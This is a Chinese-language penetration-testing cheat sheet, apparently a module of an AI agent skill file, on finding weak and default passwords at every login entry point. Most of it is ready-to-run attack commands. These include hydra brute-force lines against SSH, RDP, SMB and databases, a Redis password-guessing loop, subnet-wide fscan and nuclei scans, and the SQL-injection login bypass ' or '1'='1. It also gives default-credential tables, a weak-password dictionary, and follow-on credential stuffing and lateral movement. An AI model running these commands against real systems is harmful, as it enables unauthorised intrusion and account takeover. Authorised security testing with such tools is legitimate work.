# 全入口弱口令检测（weakpass-check）

> 来源：jiejieskill SKILL.md 拆分（2026-08-11）。由 SKILL.md 相应章节按需加载。
> 核心思路：**渗透先列全"能输入/能认证"的入口**，再逐个测弱口令/默认口令——不只是登录框。HTTP 类爆破工具见 `password-cracking.md` + 自带 `scripts/http_brute.py`；本文件是「入口清单 × 默认口令表 × 批量命令」的速查。

---

### A. Web 应用全入口（HTTP 类）

#### A.1 登录框
```bash
# ⚠️ 先确认真实账号，再爆破：
#   拿 admin/0001/1001 这些【猜测账号】爆破，即使密码对也永远"账号不存在"→ 误判无弱口令
# 正确顺序：
#   ① 先测用户名枚举/响应差异，或 SQL 注入盲注枚举真实账号(工号/<user_id>)
#   ② 确认账号真实存在后，再用该账号跑弱口令字典
#   ③ 登录失败要区分「账号不存在」vs「密码错误」两个分支（size/提示不同），别混为一谈
# 有 SQLi 时最优雅：' or '1'='1 + 密码 P = 弱口令探针，P 命中任一账号真实密码即绕过(见 auth-testing.md)
#
# 爆破器（确认账号后）
python scripts/http_brute.py -u admin -P weakpass.txt --url <login> \
    --data "user=^USER^&pass=^PASS^" --fail-marker "Invalid" -t 10 --xff --stop-on-hit
hydra -L users.txt -P weakpass.txt target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
# 后台 admin 常见弱口令：admin/admin123、admin/123456、admin/password、admin/888888
```

#### A.2 找回 / 重置密码
```bash
# 弱 token（6位数字/时间戳可预测）→ 爆破 token
# 跳步：直接访问重置成功后的页面 / 修改 user 参数重置他人
# 重置后默认口令 / 不校验旧密码
# 验证码可爆破时，结合 http_brute.py 打 token 位
```

#### A.3 注册入口
```bash
# 注册即登录 → 注册一个弱口令账号进系统测内部功能
# 邀请码/注册码可爆破 → 撞开内部注册
# 注册参数带 role=admin 等 → 高权限账号
# 注册后未强制改密 → 弱口令账号留存
```

#### A.4 验证码 / 短信验证码输入
```bash
# 万能验证码/回显/固定/前端校验绕过 → 直接爆破（auth-testing.md 6.3）
# 短信验证码爆破（测试手机号 <测试手机号>）
# 图形验证码 ddddocr / 打码平台
```

#### A.5 API / 接口认证
```bash
# 未授权接口优先（很多"弱口令"其实是没认证）
nuclei -l targets.txt -t exposures/ -t misconfiguration/
# HTTP Basic 弱口令
hydra -L users.txt -P pass.txt target http-get /admin
# JWT 弱密钥 / alg:none（用 jwt_tool）
# API key 硬编码在前端 JS / App
```

#### A.6 前端 JS 硬编码凭据
```bash
# JS 中搜测试账号/硬编码密码（见 input-upload-js.md JS 审查）
grep -rE 'password|secret|apiKey|token|test.*(account|user)' js/ --include='*.js'
# 反编译小程序/App 同理（crypto_scan.py 扫 key）
```

---

### B. 服务 / 中间件 / 数据库弱口令

> **先测未授权再测弱口令**——fscan 未授权模块、nuclei exposures 一轮，比爆破快得多。

#### B.1 端口服务弱口令
```bash
hydra -L users.txt -P weakpass.txt ssh://target -t 4
hydra -L users.txt -P weakpass.txt ftp://target
hydra -L users.txt -P weakpass.txt smb://target
hydra -t 4 -V -f -l admin -P weakpass.txt rdp://target
hydra -l admin -P weakpass.txt telnet://target
hydra -l admin -P weakpass.txt vnc://target
# SMB 空口令/常见弱口令：nxc smb <target> -u administrator -p '' --continue-on-success
```

#### B.2 数据库弱口令
```bash
hydra -L users.txt -P weakpass.txt mysql://target
hydra -L users.txt -P weakpass.txt mssql://target
hydra -L users.txt -P weakpass.txt postgres://target
hydra -l sys -P weakpass.txt oracle-listener://target:1521
# Redis（先测未授权，再弱口令）
redis-cli -h target ping                     # 未授权？
for p in $(cat weakpass.txt); do redis-cli -h target -a "$p" ping 2>/dev/null | grep -q PONG && echo "HIT: $p"; done
# MongoDB / ES / Kafka 等同样先未授权后弱口令
```

#### B.3 中间件控制台默认口令
| 服务 | 端口 | 常见默认口令 |
|------|------|-------------|
| Tomcat manager | 8080/8443 | `tomcat/tomcat` `tomcat/s3cret` `admin/tomcat` `manager/admin` |
| WebLogic | 7001 | `weblogic/weblogic` `weblogic/Oracle@123` `system/password` `weblogic/welcome1` |
| Nacos | 8848 | `nacos/nacos` `nacos/Nacos@123` |
| Jenkins | 8080 | 老版 `admin/空`，新版无默认（注意未授权） |
| RabbitMQ | 15672 | `guest/guest` |
| ActiveMQ | 8161 | `admin/admin`（还常伴未授权） |
| Grafana | 3000 | `admin/admin` |
| SonarQube | 9000 | `admin/admin` |
| Jupyter | 8888 | token 打印在服务端日志（未授权则直接进） |
| phpMyAdmin / Adminer | 80/8080 | `root/空` `root/root` |
| ES / Kibana / Eureka / Consul | 9200/5601/8761/8500 | 默认**未授权**（无密码），先测未授权 |
| Docker API | 2375 | 默认**未授权** |
| K8s dashboard | 30000+ | token/未授权 |
| 用友 NC | 8088+ | `admin/admin123` 等 |
| 若依 RuoYi | 8080 | `admin/admin123` |
```bash
# 一键扫常见默认口令
nuclei -l targets.txt -t http/default-logins/ -t http/exposures/
fscan -h targets.txt -nopoc             # 端口+服务+弱口令+未授权（fscan 内置）
```

#### B.4 批量弱口令检测
```bash
# fscan 弱口令一键（内网/公网批量均可，按目标规模控制并发）
fscan -h 10.0.0.0/24 -nopoc -np -p 21,22,135,139,445,1433,3306,5432,6379,9200
# nuclei 默认口令模板
nuclei -l targets.txt -t http/default-logins/ -severity medium,high
# 多目标×字典：先 fscan 扫出开了对应端口的资产，再 hydra 逐类打
# 命中优先排序：未授权 > Redis/ES/MongoDB 弱口令 > 中间件默认 > 数据库默认 > SSH/RDP 爆破
```

---

### C. 后台 / 业务系统入口

#### C.1 后台管理弱口令
```bash
# 常见后台路径：/admin /manage /manager /system /console /houtai
# 通用后台弱口令：admin/admin、admin/123456、admin/admin123、admin/888888、admin/1
# 系统名+弱口令：系统名(拼音)/123456、公司缩写/123456
# OA/框架默认：
#   泛微 e-cology（ecology/空、system/空、万能密码历史洞）
#   致远 A8（system/空、admin/空）
#   蓝凌 OA（admin/admin）
#   通达 OA（admin/admin 老版）
#   若依 RuoYi（admin/admin123）、Spring Boot Actuator（默认无认证=未授权）
```

#### C.2 支付 / 金融 / 业务系统入口
```bash
# 测试账号/测试卡号/沙箱环境凭据常硬编码在前端 JS 或接口文档
# 银行/支付系统：先测未授权接口 → 交易接口签名复用 → 商户后台弱口令
# 测试手机号/测试账号：短信验证码爆破（<测试手机号>）、注册枚举
# 前端 JS 反混淆找测试环境账号（de4js / jsluice）
```

#### C.3 前端 JS / App 测试账号提取
```bash
jsluice urls target.com/app.js | grep -iE 'login|admin|api'
grep -rE '"pass(wd)?"\s*:\s*"[^"]+"' static/js/ --include='*.js'   # 硬编码密码
# 小程序反编译 app.js 同理；App 用 jadx 反编译 grep
```

---

### D. 弱口令检测流程（执行顺序）

```
① 资产探测 → 列出所有"能输入/能认证"入口（Web 登录/找回/注册/API/端口/控制台/后台）
② 先测未授权：nuclei exposures + fscan（省时且命中率高）
③ Web 全入口：http_brute.py / hydra / Intruder（A 节）
④ 服务/数据库：hydra / fscan 批量（B.1/B.2）
⑤ 中间件控制台：默认口令表逐类试（B.3 表 + nuclei default-logins）
⑥ 后台/业务：默认口令 + JS/App 硬编码测试账号（C 节）
⑦ 爆破成功后：枚举更多账号 → 复用口令撞库 → 横向扩展
⚠️ 全程在授权范围内；爆破前确认限流策略，避免触发账号锁定/封 IP
```

---

### E. 通用弱口令字典（高频，供 http_brute.py / hydra 使用）

```text
# Web/后台
admin admin123 123456 password 888888 666666 1qaz2wsx qwer1234 aA123456 P@ssw0rd admin888 admin@123
# 服务
root 123456 toor root123 Password1! admin admin123
# 数据库
root 123456 sa sa123456 postgres postgres admin admin123 sys oracle system manager
# 中间件
tomcat s3cret weblogic Oracle@123 nacos Nacos@123 guest admin system manager
# 国内常用口令组合（姓名拼音+年份 / 手机尾号 / 1314520 5201314 1qaz2wsx Aa123456）
# 目标定制字典：cupp -i / cewl 爬词（详见 password-cracking.md C 节）
```
> 生产用法：把上方按目标类型筛出的口令写成 `weakpass.txt`（每行一个）喂给
> `http_brute.py -P weakpass.txt` 或 hydra `-P weakpass.txt`。
>
> **本 skill 已内置分类弱口令字典** `scripts/wordlists/weakpass.txt`
> （分类：web / service / db / middleware，`#` 注释、`##` 分类标记），
> `http_brute.py` 直接用 `--weakpass [分类]` 加载，无需建字典：
> ```bash
> python scripts/http_brute.py -u admin --weakpass --url <login> \
>     --data "user=^USER^&pass=^PASS^" --fail-marker "Invalid" -t 10 --xff --stop-on-hit
> # 指定分类：--weakpass service,db（不填 = 全部）
> ```

---

### 参考资源
- fscan（弱口令/未授权批量）: https://github.com/shadow1ng/fscan
- nuclei default-logins 模板: https://github.com/projectdiscovery/nuclei-templates
- SecLists 默认口令: https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
